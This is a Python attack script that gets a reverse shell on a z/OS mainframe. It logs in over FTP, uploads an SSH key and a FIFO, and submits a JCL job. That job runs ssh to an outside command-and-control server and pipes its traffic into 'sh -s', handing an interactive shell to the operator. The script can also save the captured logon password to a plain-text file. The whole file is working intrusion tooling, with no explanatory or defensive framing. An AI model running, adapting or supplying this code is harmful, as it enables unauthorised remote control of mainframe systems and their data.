#!/usr/bin/python
"""Gets a secure reverse shell on a mainframe by sending a JCL via FTP"""
import sys
import argparse
from string import Template
from configparser import ConfigParser, ExtendedInterpolation
import getpass
import logging
import pickle
# Import from the current project
from sshutils import ssh_utils
from zosutils import FTP, Job
from reverse_shell_management import ReverseShellManager

MKFIFO = 'SH mkfifo $FIFONAME; chmod 600 $FIFONAME'

REVERSE_SH_SSH_TO_FILE = '''SH echo '
ssh -i $KEYNAME
-l $CCUSER
$CCSERVER
-p $CCPORT
-o UserKnownHostsFile=$KNOWNHOSTSFILE
-o StrictHostKeyChecking=yes
-N
-W $NCIP:$NCP
< $FIFONAME |
sh -s > $FIFONAME 2>&1
& echo $STARTSEND
> $FIFONAME
' > $TESTPATH
'''

REVERSE_SH_SSH = '''SH sh -c '
ssh -i $KEYNAME
-l $CCUSER
$CCSERVER
-p $CCPORT
-o UserKnownHostsFile=$KNOWNHOSTSFILE
-o StrictHostKeyChecking=yes
-N
-W $NCIP:$NCP
< $FIFONAME |
sh -s > $FIFONAME 2>&1
& echo $STARTSEND
> $FIFONAME
'
'''

def parse_configuration():
    """ Parse the commandline parameters and the configuration file """
    parser = argparse.ArgumentParser(
        description='Get a secure reverse shell via z/OS FTP')
    parser.add_argument('config_file', type=str,
                        help='configuration file to use')
    parser.add_argument('-d', '--detached', default=False, action='store_true',
                        help='run in detached mode, use the config file (from -s) to run the reverse shell manager on another machine')
    parser.add_argument('-s', '--savestate', type=str,
                        help='save the running configuration (including credentials) to a config file',
                        default=None)
    parser.add_argument('-t', '--testfilename', type=str,
                        help='run in test mode, creates a testing file without running the shell',
                        default=None)
    parser.add_argument('-v', '--verbose', default=False, action='store_true',
                        help='output verbose progress')
    cli_args = parser.parse_args()
    # Validate the detached mode
    if cli_args.detached and cli_args.savestate is None:
        print('You need -s for -d')
        sys.exit(1)
    # Config file parsing
    config_file = ConfigParser(interpolation=ExtendedInterpolation())
    config_file.read(cli_args.config_file)
    running_config = config_file['ZOS']
    try:
        if running_config['password'] != '':
            logging.warning('password in config file!')
            logging.warning('Consider using the interactive password request')
    except KeyError:
        password_prompt = 'Input the password for ' + running_config['username'] + \
                          ' on ' + running_config['hostname'] + ': '
        running_config['password'] = getpass.getpass(password_prompt)
    return(config_file, cli_args)

if __name__ == '__main__':
    # Get configuration from file and command line switches
    global_config, args = parse_configuration()
    config = global_config['ZOS']

    # Set logging level
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)

    # SSH keys and fingerprinting manager
    ssh = ssh_utils

    # SSH host fingerprint for the CC server
    logging.info('Auto-detect CC ssh server fingerprint')
    autodetect_host_key = False
    try:
        cc_server_fingerprint = config['cc_server_fingerprint'].encode()
        logging.info('Fingerprint found in configuration file')
    except KeyError:
        cc_server_fingerprint = ssh.get_ecdsa_fingerprint(
            config['cc_server'],
            config['cc_port'])

    # Warn if the fingerprinting failed
    if cc_server_fingerprint == b'':
        logging.error('Empty CC server SSH fingerprint. Manually set one in the config file')
        sys.exit(1)

    # Load/generate SSH keys
    try:
        # Load key (k) and public key (p)
        key = config['key'].encode()
        authorized_key = config['authorized_key']
        logging.info('SSH keys loaded from configuration file')
    except KeyError:
        logging.info('Generate SSH keys')
        # Generate key (k) and public key (p)
        key, pubkey = ssh.gen_rsa_key(config['keybits'])
        # Output the ssh known_host value
        authorized_key = ssh.pub_rsa_to_openssh(pubkey).decode('utf-8')
        print('\nSave the pulic key below in ~' + config['cc_user'] +
              '/.ssh/authorized_keys\n')
        print(authorized_key)
        input('Press Enter to continue...')


    # Open FTP connection
    logging.info('Open FTP connection to %s', config['hostname'])
    ftp = FTP(config['hostname'], config['username'], config['password'])
    ftp.connect()

    # Set the temporary filenames for the key, FIFO and known hosts
    # Technically vulnerable to a time of check vs time of use, but makes the
    # code easier to read
    logging.info('Generate temporary files')
    ftpkeyname = ftp.gen_random_filename(path=config['temporary_path'])
    ftpfifoname = ftp.gen_random_filename(path=config['temporary_path'])
    ftpknownhosts = ftp.gen_random_filename(path=config['temporary_path'])

    # Save the key on the target
    logging.info('Upload SSH key')
    ftp.upload_string_as_file(key, ftpkeyname)

    # Save the known host file on the target
    logging.info('Upload host fingerprint')
    ftp.upload_string_as_file(cc_server_fingerprint, ftpknownhosts)

    # Create the FIFO for the shell
    logging.info('Create FIFO')
    mkfifo_step = Template(MKFIFO).substitute(FIFONAME=ftpfifoname)

    # Generate the JCL to start the SSH tunnel
    logging.info('Render reverse SSH command to JCL')
    testpath = ''
    if args.testfilename:
        ssh_command = REVERSE_SH_SSH_TO_FILE
        testpath = '%s/%s' % (config['temporary_path'], args.testfilename)
    else:
        ssh_command = REVERSE_SH_SSH
        testpath = ''
    ssh_step = Template(ssh_command).substitute(FIFONAME=ftpfifoname,
                                                KEYNAME=ftpkeyname,
                                                KNOWNHOSTSFILE=ftpknownhosts,
                                                CCUSER=config['cc_user'],
                                                CCSERVER=config['cc_server'],
                                                CCPORT=config['cc_port'],
                                                NCIP=config['ebcdiccat_host'],
                                                NCP=config['ebcdiccat_port'],
                                                STARTSEND=ReverseShellManager.TERMINATOR_STRING,
                                                TESTPATH=testpath)
    JCL = Job(config['username']+'A')
    JCL.add_inline(mkfifo_step, step_name='MKFIFO')
    JCL.add_inline(ssh_step, step_name='SHSTEP')
    # Submit the job
    logging.info('Submit job card to the mainframe')
    ftp.run_jcl(JCL.render())

    # Update the config object to pass it to the shell
    logging.info('Configure shell handler')
    config['cc_server_fingerprint'] = cc_server_fingerprint.decode()
    config['key'] = key.decode()
    config['authorized_key'] = authorized_key
    config['ftpkeyname'] = ftpkeyname
    config['ftpfifoname'] = ftpfifoname
    config['ftpknownhosts'] = ftpknownhosts

    # Save the config for future use
    if args.savestate is not None:
        logging.info('Saving state to configuration file')
        logging.warning('Saving the logon password to the file! You can remove it if you want ;)')
        with open(args.savestate, 'w') as configfile:
            global_config.write(configfile)

    # Reverse shell management
    if args.detached:
        print('Running in detatched mode, no shell activation:')
        print('Activate the reverse shell with the', args.savestate, 'file')
        input('And finally press enter to launch the shell on the target...')
    if args.testfilename:
        print('Skipping the shell activation, test mode on. Test file in', testpath)
    else:
        command = config['shell_command'].split(' ')
        shell = ReverseShellManager(command, config['codepage'],
                                    name=config['hostname'], sync_stdout=True,
                                    config=global_config)
        shell.cmdloop()

    # Close the FTP connection
    ftp.close()
